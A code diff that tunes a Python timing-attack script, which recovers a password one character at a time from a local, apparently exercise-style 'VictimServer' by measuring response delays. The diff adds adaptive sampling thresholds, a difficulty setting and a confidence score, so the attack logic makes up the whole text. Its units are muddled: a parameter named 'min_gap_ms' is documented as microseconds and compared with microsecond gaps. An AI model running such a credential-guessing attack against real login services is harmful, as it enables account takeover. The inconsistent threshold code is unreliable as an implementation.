@@ -6,6 +6,7 @@
 from abc import ABC, abstractmethod
 from collections import defaultdict
 from dataclasses import dataclass
+import math
 import statistics
 from typing import Dict, Any, List, Tuple
 
@@ -100,7 +101,8 @@ class VictimServer:
         self,
         url: str = "http://127.0.0.1/",
         alphabet: List[str] = list(string.ascii_lowercase),
-        max_pwd_len: int = 32
+        max_pwd_len: int = 32,
+        difficulty: int = 1
     ):
         """Initialize victim server details.
 
@@ -112,6 +114,7 @@ class VictimServer:
         self.url = url
         self.alphabet = alphabet
         self.max_pwd_len = max_pwd_len
+        self.difficulty = difficulty
 
 
 # ==========================
@@ -354,13 +357,10 @@ class TimingAttacker:
         tasks = [get_samples_for_char(char) for char in candidates]
         results = await asyncio.gather(*tasks, return_exceptions=False)
 
-
         for char, samples in results:
             self.measures_memory.add(posision, char, samples)
 
-        measures: Dict[str, List[int]]
         measures = self.measures_memory.get_subset(posision, candidates)
-        print(measures)
 
         return measures
 
@@ -391,7 +391,8 @@ class TimingAttacker:
         sample_increment: int,
         max_samples: int,
         initial_samples: int,
-        min_gap_us: int
+        min_gap_ms: int,
+        min_gap_confidence: float
     ) -> str:
         """Attack a single non-final position using adaptive sampling.
 
@@ -412,11 +413,14 @@ class TimingAttacker:
             candidates_samples = await self._measure_candidates(
                 candidates, posision, prefix, suffix, samples_per_candidate
             )
-            gap, best_char = self._calc_gap(candidates_samples)
 
+            gap, best_char = self._calc_gap(candidates_samples)
+            gap_confidence = gap_confidence_score(gap_us=gap, 
+                                                  difficulty=self.victim.difficulty, 
+                                                  samples_per_candidate=len(self.measures_memory.get(posision, best_char)))
             logger.log(f"       best_char '{best_char}' | gap {gap}")
 
-            if gap >= min_gap_us:
+            if gap >= min_gap_ms and gap_confidence >= min_gap_confidence:
                 return best_char
 
             # Reduce candidate set to top-k and increse sampling
@@ -460,7 +464,8 @@ class TimingAttacker:
         sample_increment: int = 2,
         max_samples: int = 10,
         initial_samples: int = 3,
-        min_gap_microseconds: int = 200
+        min_gap_ms: int = 200, 
+        min_gap_confidence = 0.95
     ) -> Tuple[str, str]:
         """Perform the complete timing attack.
 
@@ -471,7 +476,7 @@ class TimingAttacker:
             sample_increment: How many more samples to take each failed round.
             max_samples: Upper bound on samples per candidate.
             initial_samples: Starting number of samples per candidate.
-            min_gap_microseconds: Minimum timing gap to trust a decision.
+            min_gap_ms: Minimum timing gap to trust a decision (microseconds).
 
         Returns: Tuple[str, str]
             Recovered password as string.
@@ -495,7 +500,8 @@ class TimingAttacker:
                 sample_increment=sample_increment,
                 max_samples=max_samples,
                 initial_samples=initial_samples,
-                min_gap_us=min_gap_microseconds
+                min_gap_ms=min_gap_ms, 
+                min_gap_confidence=min_gap_confidence
             )
             password += next_char
 
@@ -512,16 +518,59 @@ class TimingAttacker:
 # ==========================
 # Main
 # ==========================
-def calibrate_attack_params(difficulty: int = 1) -> Dict[str, int]:
-    attack_params = {
-        "initial_samples": 3, #max(2, difficulty) if difficulty <= 5 else difficulty * 2,
-        "sample_increment": 2 if difficulty <= 4 else difficulty,
-        "max_samples": max(10, difficulty * 5),
-        "min_gap_microseconds": 200, # max(1000, 100000 // difficulty),
-        "top_k": 3 if difficulty <= 3 else 5,
-        "max_rounds": 3 if difficulty <= 2 else 5
-    }
-    return attack_params
+# def calibrate_attack_params(difficulty: int = 1) -> Dict[str, int]:
+#     attack_params = {
+#         "initial_samples": 3, #max(2, difficulty) if difficulty <= 5 else difficulty * 2,
+#         "sample_increment": 2 if difficulty <= 4 else difficulty,
+#         "max_samples": max(10, difficulty * 5),
+#         "min_gap_ms": 200, # max(1000, 100000 // difficulty),
+#         "top_k": 3 if difficulty <= 3 else 5,
+#         "max_rounds": 3 if difficulty <= 2 else 5
+#     }
+#     return attack_params
+
+def compute_min_gap_us_adaptive(
+    difficulty: int,
+    samples_per_candidate: int,
+    confidence_sigma: float = 3.0,
+    base_stall_ms: float = 250.0,
+) -> int:
+    """
+    Compute an adaptive minimum timing gap (in microseconds) that depends
+    on both difficulty and number of samples.
+
+    More samples => lower required gap.
+    """
+
+    mean_gap_ms = base_stall_ms / difficulty
+
+    # Noise of difference between two medians
+    noise_std_ms = math.sqrt(2) * difficulty / math.sqrt(samples_per_candidate)
+
+    min_gap_ms = mean_gap_ms - confidence_sigma * noise_std_ms
+
+    return max(0, int(min_gap_ms * 1000))
+
+def gap_confidence_score(
+    gap_us: float,
+    difficulty: int,
+    samples_per_candidate: int,
+) -> float:
+    """
+    Returns a confidence score in [0, 1] indicating how likely the
+    leading candidate is truly better.
+    """
+
+    noise_std_ms = math.sqrt(2) * difficulty / math.sqrt(samples_per_candidate)
+    noise_std_us = noise_std_ms * 1000
+
+    if noise_std_us == 0:
+        return 1.0
+
+    z = gap_us / noise_std_us
+
+    # map z-score to [0,1] confidence (soft, monotonic)
+    return max(0.0, min(1.0, z / 3.0))
 
 async def commit_full_attack(username: str, victim: VictimServer, difficulty: int = 1, retries_on_fail: int = 3):
     base_payload = {"user": username, "difficulty": difficulty}
@@ -566,6 +615,7 @@ async def main():
 
     total_start_ns = time.perf_counter()
     for difficulty in [1]: #range(1, MAX_DIFFICULTY + 1):
+        victim = VictimServer(url=BASE_URL, difficulty=difficulty)
         start_ns = time.perf_counter()
         password = await commit_full_attack(username=USERNAME, victim=victim, difficulty=difficulty)
         print(f"    [{time.ctime()}] | level_time: {(time.perf_counter() - start_ns) / 60} difficulty ({difficulty}) | password: {password}")
